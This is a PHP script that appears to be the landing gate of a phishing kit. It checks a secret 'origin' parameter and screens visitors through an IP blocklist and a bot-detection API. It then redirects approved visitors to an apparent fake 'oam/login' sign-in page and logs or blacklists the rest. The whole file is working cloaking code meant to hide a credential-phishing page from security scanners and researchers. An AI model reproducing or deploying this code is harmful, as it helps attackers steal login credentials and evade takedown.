<?php

session_start();

require 'Against_bot/east_b/main.php';
include('panel/config.php');


    
$WELL_SESSION_SPOX = base64_encode(time().sha1($_SERVER['REMOTE_ADDR'].$_SERVER['HTTP_USER_AGENT']).md5(uniqid(rand(), true)));

if ($redirection=="yes") {
	if (isset($_GET['origin'])) {
	 $origin = isset($_GET['origin']) ? trim(htmlentities($_GET['origin'])):'';
	  if ($origin !== $redirect) {
	  	header("HTTP/1.0 404 Not Found");
		exit();
	  }
	}else{
		header("HTTP/1.0 404 Not Found");
		exit();
	}
}	


if ($blacklist_check =="true") {
	$deny_ips = file('blocked_ips.txt');
    $ip = isset($_SERVER['REMOTE_ADDR']) ? trim($_SERVER['REMOTE_ADDR']) : '';
    if ( (array_search($ip, $deny_ips))!== FALSE ) {
        echo 'Your IP adress ('.$ip.') was blocked!';
    exit;
    }
}



if ($anti_bot=="yes") {
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, "https://api.iptrooper.net/check/$ip?full=1");
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 $result = curl_exec($ch);
 $result = json_decode($result);
 
 //define all array
 $asn ="$result->asn";
 $bad = "$result->bad";
 $code = "$result->code";
 $country ="$result->country";
 $ipaddress ="$result->ipaddress";
 $name="$result->name";
 $type="$result->type";

 $key = substr(sha1(mt_rand()),1,25);
 
if ($result->type=='valid') {
           
		$content = "#> [".$ip."] [ ".$date." ] - [ ".$os." ] \r\n";
		$save=fopen("visit_log.txt","a+");
		fwrite($save,$content);
		fclose($save);
	    $_SESSION['WELL_SPOX'] = $WELL_SESSION_SPOX;
		exit(header("Location: oam/login?origin=".$redirect."&langPref=".$cn.""));
       
			
 }
 else{
			$content = "$ip\r\n";
		    $save=fopen("blocked_ips.txt","a+");
		    fwrite($save,$content);
		    fclose($save);
		    tulis_file("services/resultz/totalbot.txt","$ip|$countrycode|$type|$ispuser|$os|");
			header("HTTP/1.0 404 Not Found");
			exit();
 }
}


?>